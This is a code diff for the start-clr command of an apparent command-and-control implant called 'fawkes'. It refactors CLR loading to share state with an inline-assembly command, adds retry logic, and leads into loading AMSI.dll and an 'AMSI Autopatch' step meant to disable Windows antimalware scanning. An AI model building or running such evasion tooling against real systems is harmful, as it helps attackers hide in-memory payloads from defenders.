@@ -7,17 +7,13 @@ import (
 	"encoding/json"
 	"fmt"
 	"runtime"
-	"sync"
+	"strings"
 	"syscall"
+	"time"
 
 	"fawkes/pkg/structs"
 
 	"github.com/Ne0nd0g/go-clr"
-)
-
-var (
-	clrInitialized bool
-	clrMutex       sync.Mutex
 )
 
 // StartCLRCommand implements the start-clr command
@@ -41,8 +37,9 @@ type StartCLRParams struct {
 
 // Execute executes the start-clr command
 func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
-	clrMutex.Lock()
-	defer clrMutex.Unlock()
+	// Use the shared assemblyMutex from inlineassembly.go for CLR state
+	assemblyMutex.Lock()
+	defer assemblyMutex.Unlock()
 
 	// Ensure we're on Windows
 	if runtime.GOOS != "windows" {
@@ -73,20 +70,44 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 
 	var output string
 
-	// Check if CLR is already initialized
-	if clrInitialized {
+	// Check if CLR is already initialized (shared state with inline-assembly)
+	if clrStarted {
 		output += "[*] CLR already initialized in this process\n"
 	} else {
-		// Load and initialize the CLR using go-clr
-		_, err := clr.LoadCLR("v4.0.30319")
+		// Redirect STDOUT/STDERR for assembly output capture
+		err := clr.RedirectStdoutStderr()
 		if err != nil {
+			output += fmt.Sprintf("[-] Warning: Could not redirect output: %v\n", err)
+		}
+
+		// Load and initialize the CLR, storing the runtime host for inline-assembly.
+		// The go-clr library's GetInterface call sometimes returns a spurious
+		// "file not found" error on first invocation. Retry up to 3 times.
+		var host *clr.ICORRuntimeHost
+		var loadErr error
+		for attempt := 1; attempt <= 3; attempt++ {
+			host, loadErr = clr.LoadCLR("v4")
+			if loadErr == nil {
+				break
+			}
+			if strings.Contains(loadErr.Error(), "cannot find the file") {
+				output += fmt.Sprintf("[*] CLR load attempt %d: transient error, retrying...\n", attempt)
+				time.Sleep(500 * time.Millisecond)
+				continue
+			}
+			break // Non-transient error, stop retrying
+		}
+		if loadErr != nil {
 			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error initializing CLR: %v", err),
+				Output:    output + fmt.Sprintf("Error initializing CLR: %v", loadErr),
 				Status:    "error",
 				Completed: true,
 			}
 		}
-		output += "[+] CLR v4.0.30319 runtime initialized successfully\n"
+		// Store in shared state so inline-assembly can reuse this runtime host
+		runtimeHost = host
+		clrStarted = true
+		output += "[+] CLR v4 runtime initialized successfully\n"
 
 		// Explicitly load AMSI.dll (needed for patching regardless of method)
 		err = loadAMSI()
@@ -95,8 +116,6 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 		} else {
 			output += "[+] AMSI.dll loaded successfully\n"
 		}
-
-		clrInitialized = true
 	}
 
 	// Apply AMSI Autopatch
